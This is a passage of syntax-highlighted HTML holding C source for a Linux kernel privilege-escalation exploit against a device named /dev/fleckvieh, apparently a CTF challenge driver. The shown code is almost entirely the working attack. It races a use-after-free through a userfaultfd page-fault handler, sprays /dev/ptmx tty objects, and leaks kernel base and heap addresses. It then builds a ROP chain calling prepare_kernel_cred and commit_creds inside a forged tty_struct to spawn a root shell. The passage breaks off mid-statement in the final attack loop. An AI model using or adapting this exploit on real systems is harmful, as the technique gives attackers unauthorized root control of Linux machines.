UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>monitor_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> handler<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_ADD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_DEL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_GET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_SET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>copy_page <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> uffdio_copy<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> arg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>    <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fault_handler_thread waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"revents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"read msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">!=</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected event on userfaultfd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] fault_handler_thread(): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"POLLIN = %d; POLLERR = %d\n"</span><span class="token punctuation">,</span>                 <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLIN<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] UFFD_EVENT_PAGEFAULT event: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flags = %llx; "</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"address = %llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[t][*] UAF read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">del</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[t][*] UAF write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">del</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected page fault"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>        uffdio_copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> copy_page<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/fleckvieh"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>  page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>              MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    copy_page <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>fault_handler_thread<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//------leak koff</span>    victim <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">get</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> page<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token operator">-</span><span class="token number">0xc3c3c0</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//-----leak kheap</span>    victim <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">get</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> page<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x1000</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">size_t</span> kheap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x1000</span><span class="token operator">+</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x38</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] kheap => 0x%lx\n"</span><span class="token punctuation">,</span> kheap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//------ropchain</span>    prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>    commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>    swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSD_RET<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span>    <span class="token comment">//------fake_tty</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>fake_tty <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_tty<span class="token punctuation">,</span> page<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_tty<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x0000000100005401</span><span class="token punctuation">;</span><span class="token comment">//magic</span>    fake_tty<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//driver</span>    fake_tty<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> kheap<span class="token punctuation">;</span><span class="token comment">//ops->ioctl</span>    fake_tty<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> PUSH_RDX_CMP_EAX_0x415b005c_POP_RSP_RBP_RET<span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fake_tty<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    victim <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    copy_page <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token function">set</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> page<span class="token operator">+</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x2000</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            <span class="token comment">//attack</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">ioctl</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token 